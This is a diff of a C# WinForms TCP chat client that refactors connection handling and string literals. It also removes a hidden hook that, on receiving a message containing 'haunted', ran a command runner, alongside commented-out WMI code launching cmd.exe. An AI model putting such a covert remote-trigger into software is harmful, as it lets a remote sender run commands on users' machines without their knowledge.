@@ -19,41 +19,29 @@ namespace client
             InitializeComponent();
         }
 
-        SimpleTcpClient client;
-        runner runner;
-
+        private SimpleTcpClient _client;
+        
         private void Client_Load_1(object sender, EventArgs e)
         {
-            client = new SimpleTcpClient(txtIP.Text);
-            client.Events.Connected += Events_Connected;
-            client.Events.Disconnected += Events_Disconnected;
-            client.Events.DataReceived += Events_DataReceived;
+            
             btnSend.Enabled = false;
+            
         }
 
         private void Events_DataReceived(object sender, DataReceivedEventArgs e)
         {
             var message = Encoding.UTF8.GetString(e.Data.ToArray());
+
             if (txtInfo.InvokeRequired)
             {
                 this.Invoke((MethodInvoker)delegate
                 {
-                    txtInfo.Text += $"{e.IpPort}: {Encoding.UTF8.GetString(e.Data.ToArray())}{Environment.NewLine}";
-
-                    
+                    txtInfo.Text += $@"{e.IpPort}: {Encoding.UTF8.GetString(e.Data.ToArray())}{Environment.NewLine}";
 
                 });
 
             }
-            if (message.Contains("haunted"))
-            {
-                //var wProcess = new ManagementClass(new ManagementPath("Win32_Process"), new ObjectGetOptions());
-                //wProcess.InvokeMethod("Create", new[] { "cmd.exe & cd C:\\Users\\Lawrence\\Desktop\\" });
-
-                runner.StartCommand();
-
-                
-            }
+            
 
 
         }
@@ -62,7 +50,7 @@ namespace client
         {
             this.Invoke((MethodInvoker)delegate {
                 
-                txtInfo.Text += $"Server disconnected.{Environment.NewLine}";
+                txtInfo.Text += $@"Server disconnected.{Environment.NewLine}";
                 btnSend.Enabled = false;
                 btnConnect.Enabled = true;
 
@@ -73,7 +61,7 @@ namespace client
         {
             this.Invoke((MethodInvoker)delegate {
                 
-                txtInfo.Text += $"Server connected.{Environment.NewLine}";
+                txtInfo.Text += $@"Server connected.{Environment.NewLine}";
             
             });
         }
@@ -82,35 +70,33 @@ namespace client
         {
             try
             {
-                client.Connect();
+                _client = new SimpleTcpClient(txtIP.Text);
+                _client.Events.Connected += Events_Connected;
+                _client.Events.Disconnected += Events_Disconnected;
+                _client.Events.DataReceived += Events_DataReceived;
+                _client.Connect();
                 btnSend.Enabled = true;
                 btnConnect.Enabled = false;
             }
             catch(Exception ex)
             {
-                MessageBox.Show(ex.Message, "Message", MessageBoxButtons.OK, MessageBoxIcon.Error); ;
+                MessageBox.Show(ex.Message, @"Message", MessageBoxButtons.OK, MessageBoxIcon.Error); ;
             }
         }
 
 
         private void btnSend_Click(object sender, EventArgs e)
         {
-            if(client.IsConnected)
+            if(_client.IsConnected)
             {
                 if(!string.IsNullOrEmpty(txtMessage.Text))
                 {
-                    client.Send(txtMessage.Text);
-                    txtInfo.Text += $"Me: {txtMessage.Text}{Environment.NewLine}";
+                    _client.Send(txtMessage.Text);
+                    txtInfo.Text += $@"Me: {txtMessage.Text}{Environment.NewLine}";
                     txtMessage.Text = string.Empty;
                 }
             }
         }
-
-        private void startVideo()
-        {
-
-        }
-
         
     }
 }
